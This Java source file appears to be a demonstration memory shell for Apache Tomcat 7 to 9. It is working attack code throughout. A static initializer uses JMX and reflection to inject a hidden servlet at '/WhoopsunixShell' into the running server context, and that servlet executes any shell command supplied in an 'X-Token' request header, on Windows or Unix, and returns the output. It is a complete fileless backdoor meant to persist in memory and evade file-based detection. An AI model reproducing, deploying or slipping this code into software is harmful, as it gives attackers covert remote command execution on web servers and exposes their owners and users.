package com.demo.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Set;

/**
 * @author Whoopsunix
 * JMX 获取 StandardContext 注入 Tomcat Servlet 型内存马
 * Tomcat 7 8 9
 */
public class TomcatServletJMXMS implements Servlet {
    private static String NAME = "Whoopsunix";
    private static String pattern = "/WhoopsunixShell";
    private static String header = "X-Token";

    public TomcatServletJMXMS() {

    }

    static {
        try {
            javax.management.MBeanServer mbeanServer = ManagementFactory.getPlatformMBeanServer();
//            javax.management.MBeanServer mbeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (com.sun.jmx.interceptor.DefaultMBeanServerInterceptor) getFieldValue(mbeanServer, "mbsInterceptor");
            com.sun.jmx.mbeanserver.Repository repository = (com.sun.jmx.mbeanserver.Repository) getFieldValue(defaultMBeanServerInterceptor, "repository");
            Set<com.sun.jmx.mbeanserver.NamedObject> objectSet = repository.query(new javax.management.ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot 中是 Tomcat
                objectSet = repository.query(new javax.management.ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (com.sun.jmx.mbeanserver.NamedObject namedObject : objectSet) {
                javax.management.DynamicMBean dynamicMBean = namedObject.getObject();
                Object authenticatorBase = getFieldValue(dynamicMBean, "resource");
                Object standardContext = getFieldValue(authenticatorBase, "context");

                // wrapper 封装
                Object container = standardContext.getClass().getSuperclass().getDeclaredMethod("findChild", String.class).invoke(standardContext, NAME);
                if (container == null) {
                    Object wrapper = standardContext.getClass().getDeclaredMethod("createWrapper").invoke(standardContext);
                    wrapper.getClass().getSuperclass().getDeclaredMethod("setName", String.class).invoke(wrapper, NAME);
                    Servlet servlet = new TomcatServletJMXMS();
                    wrapper.getClass().getDeclaredMethod("setServletClass", String.class).invoke(wrapper, servlet.getClass().getName());
                    wrapper.getClass().getDeclaredMethod("setServlet", Servlet.class).invoke(wrapper, servlet);
                    // 添加到 standardContext
                    standardContext.getClass().getSuperclass().getDeclaredMethod("addChild", Class.forName("org.apache.catalina.Container")).invoke(standardContext, wrapper);


                    try{
                        // M1 Servlet映射到URL模式
                        // standardContext.addServletMapping(pattern,NAME);
                        Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
                        addServletMappingMethod.setAccessible(true);
                        addServletMappingMethod.invoke(standardContext, pattern, NAME);
                    } catch (NoSuchMethodException e) {
                        // M2 Servlet3 新特性 Dynamic
//                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
//                        registration.addMapping(pattern);
//                        Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
                        Object applicationServletRegistration = Class.forName("org.apache.catalina.core.ApplicationServletRegistration").getConstructor(Class.forName("org.apache.catalina.Wrapper"), Class.forName("org.apache.catalina.Context")).newInstance(wrapper, standardContext);
                        Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(applicationServletRegistration, (Object) new String[]{pattern});
                    }

                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(header);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
